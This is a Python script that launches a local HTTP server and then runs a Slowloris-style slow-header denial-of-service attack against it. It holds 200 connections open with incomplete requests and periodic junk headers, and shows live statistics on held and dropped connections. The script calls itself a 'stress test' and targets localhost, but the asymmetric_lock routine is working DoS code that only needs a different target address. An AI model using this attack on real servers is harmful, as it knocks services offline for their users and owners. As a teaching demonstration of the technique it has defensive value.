import asyncio
import http.server
import socketserver
import threading
import time
import sys
import random

TARGET_IP = "127.0.0.1"
TARGET_PORT = 8080
CONNECTIONS = 200

stats = {
    "active_locks": 0,
    "dropped_connections": 0,
    "latency_history": []
}

def boot_vulnerable_server():
    Handler = http.server.SimpleHTTPRequestHandler
    with socketserver.TCPServer((TARGET_IP, TARGET_PORT), Handler) as httpd:
        httpd.serve_forever()

async def asymmetric_lock():
    try:
        start_time = time.time()
        reader, writer = await asyncio.open_connection(TARGET_IP, TARGET_PORT)
        
        stats["active_locks"] += 1
        stats["latency_history"].append(time.time() - start_time)
        
        writer.write(f"GET /?{random.randint(1, 1000)} HTTP/1.1\r\n".encode("utf-8"))
        await writer.drain()

        while True:
            await asyncio.sleep(random.uniform(5.0, 10.0))
            writer.write(f"X-Keep-Alive: {random.randint(1, 5000)}\r\n".encode("utf-8"))
            await writer.drain()
    except Exception:
        stats["dropped_connections"] += 1
        if stats["active_locks"] > 0:
            stats["active_locks"] -= 1

async def telemetry_dashboard():
    print(f"\n\033[91m[!] GRACE PERIOD OVER. INITIATING ASYMMETRIC STRESS TEST.\033[0m")
    while True:
        await asyncio.sleep(1)
        recent_latency = stats["latency_history"][-50:]
        avg_latency = sum(recent_latency) / max(1, len(recent_latency)) if recent_latency else 0.0
        
        lat_color = "\033[92m" if avg_latency < 0.5 else "\033[91m"
        reset = "\033[0m"
        
        sys.stdout.write(
            f"\r[ TELEMETRY ] "
            f"Locks: \033[96m{stats['active_locks']}\033[0m | "
            f"Dropped: \033[91m{stats['dropped_connections']}\033[0m | "
            f"Latency: {lat_color}{avg_latency:.4f}s{reset}    "
        )
        sys.stdout.flush()

async def main():
    # 1. Boot the server
    server_thread = threading.Thread(target=boot_vulnerable_server, daemon=True)
    server_thread.start()
    
    print(f"\n\033[92m[+] VICTIM SERVER ONLINE AT http://{TARGET_IP}:{TARGET_PORT}\033[0m")
    print("[*] GRACE PERIOD ACTIVE. Go open your browser and verify the server is alive.")
    
    # 2. Give the user time to test the baseline
    for i in range(15, 0, -1):
        sys.stdout.write(f"\r[*] Attack launches in {i} seconds... ")
        sys.stdout.flush()
        await asyncio.sleep(1)
        
    # 3. Launch the attack
    tasks = [asyncio.create_task(telemetry_dashboard())]
    for _ in range(CONNECTIONS):
        tasks.append(asyncio.create_task(asymmetric_lock()))
        await asyncio.sleep(0.02) 
        
    await asyncio.gather(*tasks)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n\n[-] Shutting down.")
        sys.exit()